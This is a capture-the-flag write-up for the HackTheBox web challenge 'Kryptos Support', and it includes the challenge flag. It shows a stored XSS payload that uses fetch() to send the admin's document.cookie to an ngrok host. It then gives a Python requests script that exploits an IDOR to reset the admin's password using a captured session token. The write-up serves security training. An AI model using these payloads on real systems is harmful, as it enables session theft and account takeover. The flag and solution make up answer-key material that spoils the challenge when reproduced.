



# **Kryptos Support**



## Challenge Author(s):
Ulysses

## Description:
`
The secret vault used by the Longhir’s planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?`

## Target: docker ip on demand

## Difficulty/Points: 300/easy

## Flag: HTB{x55_4nd_id0rs_ar3_fun!!}

## Challenge

The challenge is presented with a page with a red theme that has a textbox on which we can write anything. Underneath we have a button that when pressed shows a message about sending a ticket to an admin. There is also a button that if pressed takes me to a login page whose credentials I don't know.

# Solution 

I first try to see what this textbox is vulnerable to. After many attempts I realise that it is vulnerable to XSS. By trying this simple payload I get a request from the victim site obtaining the admin's cookie. Replacing my current cookie with the admin's cookie I head to his webpage and see my own and other users' tickets that have been submitted.

<script> fetch('https://fdf1-109-52-216-63.ngrok.io/c='+document.cookie) </script>

after doing so, it is possible to update the admin's password simply by going to the password change page visible to the admin, intercepting the request with burp and then sending the chosen password to the password update endpoint with the admin's id, which is trivially 1. I attach the paylaod I used for simplicity.

```python
import requests

burp0_url = "http://138.68.189.179:32763/api/users/update"
burp0_cookies = {"session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MjcyNzZ9.tbovyxtI9JAbDeGwfx8EqYal2iWilMBHg3a89R87_zg"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://138.68.189.179:32763", "Referer": "http://138.68.189.179:32763/settings", "Accept-Encoding": "gzip, deflate", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_json={"password": "a", "uid": "1"}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
```